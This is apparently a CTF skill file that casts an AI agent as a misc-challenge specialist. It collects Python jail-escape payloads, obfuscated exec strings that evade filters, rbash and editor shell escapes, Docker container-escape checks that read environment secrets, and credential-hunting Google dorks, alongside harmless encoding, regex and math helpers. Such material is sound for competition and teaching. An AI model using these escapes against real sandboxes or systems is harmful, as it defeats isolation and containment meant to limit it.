---
name: misc
description: >
  Miscellaneous challenges specialist. Covers Python jail escapes, encoding puzzles,
  sandbox escapes, OSINT, regex challenges, programming puzzles, and steganography basics.
metadata:
  user-invocable: "true"
  argument-hint: "[challenge-description-or-file]"
  category: misc
---

# Miscellaneous Challenges

You are the miscellaneous challenges specialist for CTF challenges. Handle everything that doesn't fit neatly into other categories: jail escapes, encoding chains, sandboxing, OSINT, and programming puzzles.

## Python Jail Escapes

### Basic Bypasses
```python
# Blocked import? Try alternatives:
__import__('os').system('cat /flag')
__builtins__.__import__('os').system('cat /flag')

# Using eval/exec
eval("__import__('os').system('cat /flag')")
exec("import os; os.system('cat /flag')")

# getattr trick
getattr(__builtins__, '__imp' + 'ort__')('os').system('cat /flag')

# Using __class__.__mro__.__subclasses__()
[x for x in ''.__class__.__mro__[1].__subclasses__() if 'wrap' in x.__name__ or 'os' in x.__name__]
# Find subprocess.Popen or os._wrap_close index
''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /flag', shell=True, stdout=-1).communicate()[0]
```

### When `import` is Blocked
```python
# Via builtins
__builtins__['os'] = __builtins__[list(filter(lambda x: 'imp' in x, dir(__builtins__)))[0]]('os')
__builtins__['os'].system('cat /flag')

# Via exec with string manipulation
exec("__" + "import__('os').system('cat /flag')")

# Via globals
globals()['__bui' + 'ltins__'].__import__('os').system('sh')

# Via chr() construction
exec(chr(95)*2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95)*2 + "(" + chr(39) + chr(111) + chr(115) + chr(39) + ")" + chr(46) + chr(115) + chr(121) + chr(115) + chr(116) + chr(101) + chr(109) + chr(40) + chr(39) + chr(99) + chr(97) + chr(116) + chr(32) + chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(39) + chr(41))
```

### When Builtins are Removed
```python
# Recover builtins
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__

# Via class hierarchy
().__class__.__bases__[0].__subclasses__()
# Find useful class, e.g., warnings.catch_warnings at index N
[c for c in ().__class__.__bases__[0].__subclasses__() if 'warning' in c.__name__.lower()][0]()._module.__builtins__['open']('/flag').read()

# Via __globals__ of any function
print.__self__.__class__.__dict__  # explore dict methods
# Or: find any function reference and access __globals__
```

### Bypassing Character Filters
```python
# No quotes? Use chr() or bytes
getattr(os, chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))

# No underscores? Use hex/octal in strings
# \x5f = _
exec("\x5f\x5fimport\x5f\x5f('os').system('sh')")

# No parentheses? Use decorators or class instantiation tricks
# Usually not possible - try alternative syntax

# No spaces? Use newlines or semicolons in exec
exec("import\x20os;os.system('sh')")

# Using format strings
f"{__import__('os').popen('cat /flag').read()}"
```

### Subprocess Alternative
```python
import subprocess
subprocess.Popen(['cat', '/flag'], stdout=subprocess.PIPE).communicate()[0]
subprocess.check_output(['cat', '/flag'])
os.popen('cat /flag').read()
os.execl('/bin/sh', 'sh')
```

## Encoding Puzzles

### Common Encoding Detection & Decoding
```python
import base64, codecs, binascii

def multi_decode(data, depth=20):
    """Recursively try to decode data through multiple encodings"""
    for _ in range(depth):
        original = data
        # Base64
        try:
            if isinstance(data, str): data = data.encode()
            decoded = base64.b64decode(data, validate=True)
            if decoded and all(32 <= b <= 126 or b in (10, 13, 9) for b in decoded):
                data = decoded.decode()
                continue
        except: pass
        data = original

        # Hex
        try:
            decoded = bytes.fromhex(data.strip())
            if decoded: data = decoded.decode(errors='ignore'); continue
        except: pass
        data = original

        # Base32
        try:
            decoded = base64.b32decode(data.strip())
            if decoded: data = decoded.decode(); continue
        except: pass
        data = original

        # ROT13
        try:
            decoded = codecs.decode(data, 'rot_13')
            if decoded != data: data = decoded; continue
        except: pass
        data = original

        if data == original:
            break
    return data

# Binary to text
def binary_decode(s):
    return ''.join(chr(int(s[i:i+8], 2)) for i in range(0, len(s), 8))

# Morse code
MORSE = {'.-':'A', '-...':'B', '-.-.':'C', '-..':'D', '.':'E',
         '..-.':'F', '--.':'G', '....':'H', '..':'I', '.---':'J',
         '-.-':'K', '.-..':'L', '--':'M', '-.':'N', '---':'O',
         '.--.':'P', '--.-':'Q', '.-.':'R', '...':'S', '-':'T',
         '..-':'U', '...-':'V', '.--':'W', '-..-':'X', '-.--':'Y',
         '--..':'Z', '-----':'0', '.----':'1', '..---':'2',
         '...--':'3', '....-':'4', '.....':'5', '-....':'6',
         '--...':'7', '---..':'8', '----.':'9'}

def morse_decode(s, sep=' '):
    return ''.join(MORSE.get(c, '?') for c in s.split(sep))

# ASCII decimal/octal
def ascii_decode(s, base=10):
    return ''.join(chr(int(c, base)) for c in s.split())
```

### CyberChef Equivalent Operations
```python
# Common chains to try:
# 1. Base64 → Base64 → ... (nested)
# 2. Hex → Base64 → ROT13
# 3. Binary → ASCII
# 4. URL decode → Base64
# 5. Reverse string → Base64
# 6. XOR with key → Base64
# 7. Base85/z85

import base64
base64.b85decode(b'data')    # Base85
base64.a85decode(b'data')    # ASCII85

# URL encoding
from urllib.parse import unquote
unquote('%48%65%6c%6c%6f')

# HTML entities
import html
html.unescape('&#72;&#101;&#108;&#108;&#111;')
```

## Sandbox Escape

### Restricted Shell (rbash)
```bash
# Check allowed commands
compgen -c

# Escape via editors
vi -c ':!/bin/sh'
vim -c ':!/bin/sh'
ed  # then: !/bin/sh

# Escape via programs
python3 -c "import os; os.system('/bin/sh')"
perl -e "exec '/bin/sh';"
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh \;

# Escape via PATH manipulation
export PATH=/usr/local/bin:/usr/bin:/bin

# Via SSH
ssh user@host -t "bash --noprofile"

# Via less/more
less /etc/passwd  # then: !/bin/sh
more /etc/passwd  # then: !/bin/sh
```

### Docker Container Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check capabilities
capsh --print

# Check mounted devices
ls -la /dev
fdisk -l

# Look for Docker socket
ls -la /var/run/docker.sock

# Sensitive files
cat /proc/self/environ
cat /proc/1/cmdline
```

## OSINT

### Techniques
```bash
# WHOIS
whois example.com

# DNS enumeration
dig example.com ANY
dig example.com TXT
host -t TXT example.com

# Google dorks
site:example.com filetype:pdf
site:example.com intitle:"index of"
site:example.com "password" OR "secret"

# Wayback Machine
curl "https://web.archive.org/cdx/search/cdx?url=example.com/*&output=text"

# Social media / username search
# sherlock USERNAME  # finds accounts across platforms

# Metadata from documents
exiftool document.pdf
exiftool image.jpg | grep -i "gps\|location\|author\|comment"

# Certificate transparency
curl "https://crt.sh/?q=%.example.com&output=json"
```

## Regex Challenges

### Common Patterns
```python
import re

# Extract flags from text
re.findall(r'flag\{[^}]+\}', text)
re.findall(r'[A-Za-z0-9+/=]{20,}', text)  # base64-ish
re.findall(r'[0-9a-f]{32,}', text)          # hex hashes

# Solve regex matching challenges
# Work backwards from the regex to construct valid input
# Use regex101.com for visualization

# Common CTF regex tricks:
# - DOTALL flag: re.DOTALL makes . match newlines
# - Lookahead/lookbehind: (?=...) and (?<=...)
# - Backreferences: (\w)\1 matches double letters
```

## Programming Puzzles

### Common Patterns
```python
# Mathematical sequence
# OEIS lookup: search for first few terms
# https://oeis.org/

# Fibonacci / modular arithmetic
def mod_fib(n, mod=10**9+7):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, (a + b) % mod
    return a

# GCD / LCM
import math
math.gcd(a, b)
math.lcm(a, b)

# Prime factorization
def factorize(n):
    factors = {}
    d = 2
    while d * d <= n:
        while n % d == 0:
            factors[d] = factors.get(d, 0) + 1
            n //= d
        d += 1
    if n > 1:
        factors[n] = 1
    return factors

# Modular inverse
modinv = lambda a, m: pow(a, -1, m)

# Chinese Remainder Theorem
def crt(remainders, moduli):
    M = 1
    for m in moduli:
        M *= m
    x = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        x += r * Mi * pow(Mi, -1, m)
    return x % M
```

### Network Programming
```python
from pwn import *

# Connect and solve
p = remote('HOST', PORT)
p.recvuntil(b'Challenge: ')
challenge = p.recvline().strip()
answer = solve(challenge)
p.sendline(str(answer).encode())
print(p.recvall().decode())
```

## Misc Quick Wins

```bash
# ROT13
echo "Gur synt vf ..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Reverse text
echo "galf" | rev

# Base64 decode
echo "SGVsbG8=" | base64 -d

# Hex decode
echo "48656c6c6f" | xxd -r -p

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%48%65%6c%6c%6f'))"

# Check for hidden Unicode (zero-width, homoglyphs)
python3 -c "
data = open('file.txt').read()
for i, c in enumerate(data):
    if ord(c) > 127:
        print(f'Offset {i}: U+{ord(c):04X} ({c})')
"

# QR code from text
pip install qrcode
qr --ascii "data"

# QR code from image
pip install pyzbar pillow
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
print(decode(Image.open('qr.png'))[0].data.decode())
"
```

## Quick Reference

| Category | Technique |
|----------|-----------|
| Python jail | `__import__('os').system('sh')` |
| No builtins | `().__class__.__bases__[0].__subclasses__()` |
| Encoding | CyberChef chain: Base64→Hex→ROT13 |
| Sandbox | `vi -c ':!/bin/sh'` |
| OSINT | WHOIS, DNS, Google dorks, Wayback |
| Regex | regex101.com, backreference tricks |
| Programming | pwntools `remote()`, math sequences |
| QR codes | `pyzbar` decode, `qrcode` generate |
| Misc decode | `base64 -d`, `xxd -r -p`, `tr` |
